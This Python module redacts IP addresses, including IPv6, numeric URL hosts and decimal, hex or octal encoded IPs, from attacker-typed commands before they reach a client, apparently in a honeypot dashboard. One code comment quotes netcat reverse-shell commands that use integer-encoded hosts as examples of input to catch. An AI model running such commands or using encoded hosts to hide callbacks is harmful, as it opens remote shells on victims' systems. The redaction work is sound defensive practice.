"""Blot IP literals out of attacker-controlled free text.

Commands and download URLs are whatever the attacker typed, so they can carry
third-party IPs that must not reach a client. Mirrors
dashboard/src/utils/redactIps.ts - keep the two in sync.
"""

from __future__ import annotations

import re

IP_BLOT = "‹ip›"  # the same token the dashboard uses

# IPv4: four dot-separated octets 0-255.
_IPV4 = (
    r"(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)"
)

# IPv6, canonical matcher.
_IPV6_CORE = "|".join(
    [
        r"(?:[0-9A-Fa-f]{1,4}:){6}" + _IPV4,
        r"(?:[0-9A-Fa-f]{1,4}:){1,4}:" + _IPV4,
        r"::(?:[0-9A-Fa-f]{1,4}:){0,5}" + _IPV4,
        r"(?:[0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4}",
        r"(?:[0-9A-Fa-f]{1,4}:){1,7}:",
        r"(?:[0-9A-Fa-f]{1,4}:){1,6}:[0-9A-Fa-f]{1,4}",
        r"(?:[0-9A-Fa-f]{1,4}:){1,5}(?::[0-9A-Fa-f]{1,4}){1,2}",
        r"(?:[0-9A-Fa-f]{1,4}:){1,4}(?::[0-9A-Fa-f]{1,4}){1,3}",
        r"(?:[0-9A-Fa-f]{1,4}:){1,3}(?::[0-9A-Fa-f]{1,4}){1,4}",
        r"(?:[0-9A-Fa-f]{1,4}:){1,2}(?::[0-9A-Fa-f]{1,4}){1,5}",
        r"[0-9A-Fa-f]{1,4}:(?::[0-9A-Fa-f]{1,4}){1,6}",
        r":(?:(?::[0-9A-Fa-f]{1,4}){1,7}|:)",
    ]
)
_IPV6 = r"(?<![0-9A-Fa-f:])(?:" + _IPV6_CORE + r")(?:%[0-9A-Za-z]+)?(?![0-9A-Fa-f:])"

# Standalone dotted-quad. The lookbehind/lookahead reject a 5th adjacent octet so
# version strings like `lib.so.1.2.3.4.5` are not partially blotted, while a
# real IP at a sentence end still matches.
_IPV4_STANDALONE = r"(?<!\d\.)\b" + _IPV4 + r"\b(?!\.\d)"

# Alternate-encoding hosts only carry meaning right after a URL scheme: decimal
# (`http://2130706433/`), hex (`http://0x7f000001/`), octal, or dotted-hex
# (`http://0x7f.1/`). The scheme itself is any URI scheme (ftp://, tftp://,
# scp://, ...), not just http(s).
_NUMERIC_HOST = (
    r"(?:0[xX][0-9A-Fa-f]+|0[0-7]+|\d{1,10})"
    r"(?:\.(?:0[xX][0-9A-Fa-f]+|0[0-7]+|\d{1,10})){0,3}"
)
_URL_NUMERIC_HOST = (
    r"(?P<scheme>\b[A-Za-z][A-Za-z0-9+.\-]*://(?:[^/?#\s@]+@)?)"
    r"(?P<host>" + _NUMERIC_HOST + r")(?!:[0-9A-Fa-f]*:)(?=[/:?#\s]|$)"
)

# Shell commands drop the scheme entirely (`nc -e /bin/sh 2130706433 4444`,
# `nc 0x7f000001 4444`), so a bare integer-encoded IP has to be caught without
# one. Bounded on both sides and long enough (hex >=5 digits, octal 8-11
# digits, decimal 8-10 digits) to stay clear of ports, chmod flags, `sleep 30`,
# `bs=1024`; `_replace` additionally requires the parsed value to land in
# 16777216..4294967295 (first octet >= 1) before it blots the token.
# Accepted false positive: a bare current-era unix timestamp is 10 digits and
# sits inside that range, so `echo 1735689600` gets blotted. Over-redacting a
# timestamp is the cheaper mistake than leaking a third-party host.
_SCHEMELESS_NUMERIC_HOST = (
    r"(?<![\w.:-])"
    r"(?P<numtok>0[xX][0-9A-Fa-f]{5,8}|0[0-7]{8,11}|\d{8,10})"
    r"(?![\w.:-])"
)

# Token first (idempotent re-redaction); then IPv6 (incl. embedded-v4) so a full
# literal wins over the numeric-host rules; dotted-quad; scheme-qualified
# numeric-host; schemeless numeric-host last since it is the most conservative
# (range-checked) fallback.
_IP_RE = re.compile(
    "(?:"
    + re.escape(IP_BLOT)
    + ")|(?:"
    + _IPV6
    + ")|(?:"
    + _IPV4_STANDALONE
    + ")|(?:"
    + _URL_NUMERIC_HOST
    + ")|(?:"
    + _SCHEMELESS_NUMERIC_HOST
    + ")"
)

# Valid IPv4-as-integer range with the first octet >= 1 (0.x.x.x is not a
# routable host), used to gate the schemeless numeric-host branch.
_MIN_IP_INT = 16777216
_MAX_IP_INT = 4294967295


def _parse_numeric_token(tok: str) -> int:
    # int(tok, 0) rejects bare zero-padded octal ("0777") since Python 3 only
    # accepts the 0o prefix for base 0, so octal is parsed explicitly here.
    if tok[:2] in ("0x", "0X"):
        return int(tok, 16)
    if tok[0] == "0" and len(tok) > 1 and all(c in "01234567" for c in tok[1:]):
        return int(tok, 8)
    return int(tok, 10)


def _replace(m: re.Match[str]) -> str:
    groups = m.groupdict()
    # URL numeric-host branch: keep the scheme/userinfo, blot only the host.
    if groups.get("scheme") is not None and groups.get("host") is not None:
        return groups["scheme"] + IP_BLOT
    # Schemeless numeric-host branch: only blot if the token actually decodes
    # into a plausible IPv4 address, otherwise leave the original text alone.
    numtok = groups.get("numtok")
    if numtok is not None:
        value = _parse_numeric_token(numtok)
        if not (_MIN_IP_INT <= value <= _MAX_IP_INT):
            return m.group(0)
        return IP_BLOT
    return IP_BLOT


def redact_ips(text: str | None) -> str | None:
    """Return text with every IP literal replaced by ‹ip›.

    Covers IPv4, IPv6 (with embedded-v4 and URL forms), numeric URL hosts.
    None passes through; already-blotted text is unchanged.

    Arguments:
      text: free text from attacker; may contain IP literals

    Returns:
      text with IPs blotted; None if input is None
    """
    if text is None:
        return None
    return _IP_RE.sub(_replace, text)
